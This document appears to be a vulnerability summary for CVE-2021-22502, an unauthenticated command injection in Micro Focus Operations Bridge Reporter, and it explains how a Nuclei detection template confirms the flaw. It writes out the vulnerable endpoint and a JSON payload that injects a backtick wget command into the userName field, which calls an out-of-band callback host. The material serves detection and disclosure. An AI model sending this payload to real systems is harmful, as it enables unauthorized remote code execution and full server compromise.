---
cve_id: CVE-2021-22502
template_path: nuclei-templates/http/cves/2021/CVE-2021-22502.yaml
affected_product: Micro Focus Operations Bridge Reporter
severity: critical
authentication: none
external_callback: true
affected_versions: 10.40
preconditions: []
poc_classification: rce
---

## Vulnerability

Micro Focus Operations Bridge Reporter version 10.40 contains a critical remote code execution vulnerability (CVE-2021-22502, CWE-78: OS Command Injection). The vulnerability allows unauthenticated attackers to execute arbitrary operating system commands on the server through command injection in the authentication endpoint. The flaw exists in the LogonResource endpoint where user-supplied input in the `userName` parameter is not properly sanitized before being processed, allowing shell metacharacters and command sequences to be injected and executed. This results in complete system compromise, enabling attackers to execute malware, access all monitoring data, modify system configurations, and perform unauthorized operations without any credentials. The CVSS score of 9.8 reflects the severity of unauthenticated remote code execution with network attack vector and no user interaction required.

## PoC / Detection

Classification: rce

The template detects this vulnerability by sending a POST request to `/AdminService/urest/v1/LogonResource` with a JSON payload containing a command injection attempt in the `userName` field. The payload embeds a `wget` command with backtick command substitution syntax that attempts to contact an Interactsh callback server: `{"userName":"something \`wget {{interactsh-url}}\`","credential":"whatever"}`. 

The template verifies successful exploitation through multiple conditions:
1. Detection of HTTP or DNS callbacks to the Interactsh server, confirming command execution
2. Response body containing both "An error occurred" and "AUTHENTICATION_FAILED" strings, indicating the authentication failed but the command was processed
3. Response header containing "application/json"
4. HTTP status code 401 (Unauthorized)

The combination of authentication failure with successful out-of-band callback confirms that the injected command executed despite authentication failing, proving the command injection vulnerability.

## References

- https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBR.md
- https://softwaresupport.softwaregrp.com/doc/KM03775947
- https://www.zerodayinitiative.com/advisories/ZDI-21-153/
- https://nvd.nist.gov/vuln/detail/CVE-2021-22502
- https://www.zerodayinitiative.com/advisories/ZDI-21-154/
